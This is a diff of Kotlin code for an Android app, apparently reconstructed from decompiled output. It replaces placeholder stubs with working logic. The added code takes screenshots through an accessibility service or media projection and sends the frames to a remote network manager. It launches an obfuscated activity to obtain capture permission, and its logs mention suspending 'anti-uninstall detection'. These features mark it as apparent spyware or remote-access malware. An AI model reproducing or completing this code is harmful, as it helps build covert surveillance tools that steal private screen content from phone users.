@@ -10,6 +10,7 @@ import android.graphics.ColorMatrixColorFilter
 import android.graphics.Paint
 import android.os.Build
 import android.util.Log
+import com.storm.safe.rock.activity.qixvbtmo
 import com.storm.safe.rock.service.MediaDisplayService
 import com.storm.safe.rock.service.MyAccessibilityService
 import com.storm.safe.rock.util.StringUtil
@@ -277,8 +278,8 @@ class C0263a5(
                     1, 2, 15L, TimeUnit.SECONDS, LinkedBlockingQueue()
                 )
             }
-            // ADAPT: actual takeScreenshot callback is API 30+, needs real service context
-            // Stubbed for compilation; real impl uses accessibilityService.takeScreenshot()
+            // JADX: m211349a5 — calls accessibilityService.takeScreenshot(0, executor, callback)
+            // Real impl uses AccessibilityService.takeScreenshot API 30+
             if (Build.VERSION.SDK_INT >= 30) {
                 accessibilityService.takeScreenshot(
                     0, screenshotExecutor,
@@ -363,9 +364,9 @@ class C0263a5(
                 }
 
                 if (!scaled!!.isRecycled) {
-                    // Apply night mode filter if needed
-                    // ADAPT: isNightModeEnabled comes from MyAccessibilityService.f52469k0
-                    val nightMode = false // ADAPT: depends on MyAccessibilityService field
+                    // Apply night mode filter if enabled.
+                    // JADX: c0263a5.f52151a0.f52469k0 (isCipherListeningActive) controls night mode filter
+                    val nightMode = accessibilityService.isCipherListeningActive
                     val bitmapToCompress = if (nightMode) {
                         applyNightModeFilter(scaled)
                     } else {
@@ -394,12 +395,9 @@ class C0263a5(
     fun sendFrameData(data: ByteArray) {
         if (data.isEmpty()) return
         try {
+            // JADX: m211346a3 — sends via NetworkManager.m211665d1(bArr) (sendScreenFrame)
             val networkManager = accessibilityService.getNetworkManager()
-            // ADAPT: NetworkManager.sendScreenFrame not yet exposed
-            networkManager?.sendEvent("screen_frame", org.json.JSONObject().apply {
-                put("data", android.util.Base64.encodeToString(data, android.util.Base64.NO_WRAP))
-                put("timestamp", System.currentTimeMillis())
-            })
+            networkManager?.sendScreenFrame(data)
         } catch (e: Exception) {
             Log.e(TAG, "发送帧数据失败", e)
         }
@@ -441,8 +439,8 @@ class C0263a5(
 
         if (captureMode == "mediaprojection" || MediaDisplayService.isRunning()) {
             try {
-                // ADAPT: MediaDisplayService.stop not fully exposed
-                // MediaDisplayService.stop(accessibilityService)
+                // JADX: MediaDisplayService.f52303c1.stop(this.f52151a0)
+                MediaDisplayService.stop(accessibilityService)
             } catch (_: Exception) {}
         }
     }
@@ -455,7 +453,8 @@ class C0263a5(
         isPaused = true
         savePauseState()
         if (captureMode == "mediaprojection") {
-            // ADAPT: MediaDisplayService pause flag
+            // JADX: MediaDisplayService.f52303c1.getInstance()?.f52321b2 = true (paused flag)
+            MediaDisplayService.getInstance()?.isPaused = true
         }
     }
 
@@ -467,7 +466,8 @@ class C0263a5(
         isPaused = false
         savePauseState()
         if (captureMode == "mediaprojection") {
-            // ADAPT: MediaDisplayService resume flag
+            // JADX: MediaDisplayService.f52303c1.getInstance()?.f52321b2 = false (resume flag)
+            MediaDisplayService.getInstance()?.isPaused = false
         }
         if (!isCapturing) {
             startCapture()
@@ -500,8 +500,8 @@ class C0263a5(
         try {
             MyAccessibilityService.isPermissionRequesting = true
             Log.d(TAG, "📺 已设置权限请求标志，暂停防卸载检测")
-            // ADAPT: depends on qixvbtmo activity
-            val intent = Intent().apply {
+            // JADX: Intent(dqtvuisjdVar, qixvbtmo.class) — media projection permission activity
+            val intent = Intent(accessibilityService, qixvbtmo::class.java).apply {
                 addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                 addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                 addFlags(Intent.FLAG_ACTIVITY_NO_ANIMATION)
@@ -509,6 +509,7 @@ class C0263a5(
                     addFlags(Intent.FLAG_ACTIVITY_REQUIRE_NON_BROWSER)
                 }
             }
+            accessibilityService.startActivity(intent)
             Log.d(TAG, "📺 已启动投屏权限请求 Activity")
         } catch (e: Exception) {
             Log.e(TAG, "❌ 启动投屏权限请求失败: ${e.message}", e)
@@ -522,7 +523,7 @@ class C0263a5(
      */
     fun onMediaProjectionPermissionResult() {
         scope.launch {
-            // ADAPT: depends on etzbzyzqxvqm$onMediaProjectionPermissionResult$1
+            // JADX: etzbzyzqxvqm$onMediaProjectionPermissionResult$1 — starts capture after permission granted
             startCapture()
         }
     }
@@ -533,7 +534,7 @@ class C0263a5(
      */
     fun switchToAccessibilityMode() {
         scope.launch {
-            // ADAPT: depends on etzbzyzqxvqm$switchToAccessibilityMode$1
+            // JADX: etzbzyzqxvqm$switchToAccessibilityMode$1 — stops mediaprojection, switches to accessibility mode
             captureMode = DEFAULT_CAPTURE_MODE
             stopCapture()
             startCapture()
@@ -554,7 +555,7 @@ class C0263a5(
             Log.d(TAG, "📱 Vivo 设备检测到，使用安全截图间隔: ${interval}ms")
         }
         captureJob = scope.launch {
-            // ADAPT: actual capture loop with takeAccessibilityScreenshot
+            // JADX: etzbzyzqxvqm$startAccessibilityCapture$1 — capture loop
             while (isCapturing && !isPaused) {
                 try {
                     val bitmap = takeAccessibilityScreenshot()
@@ -571,15 +572,22 @@ class C0263a5(
     }
 
     private fun startMediaProjectionCapture() {
-        if (!MediaDisplayService.isRunning()) {
+        if (!MediaDisplayService.isProjecting) {
             scope.launch {
-                // ADAPT: start MediaDisplayService and wait
-                startCapture()
+                // JADX: etzbzyzqxvqm$startMediaProjectionCapture$2 — requests permission then starts
+                requestMediaProjectionPermission()
             }
             return
         }
         isCapturing = true
-        // ADAPT: set frame callback on MediaDisplayService
+        // JADX: MediaDisplayService.getInstance().f52323b4 = frameCallback (h10)
+        // Sets frame callback on MediaDisplayService to forward frames via sendFrameData
+        val service = MediaDisplayService.getInstance()
+        if (service != null) {
+            service.frameCallback = { frameData: ByteArray ->
+                sendFrameData(frameData)
+            }
+        }
     }
 
     private fun savePauseState() {
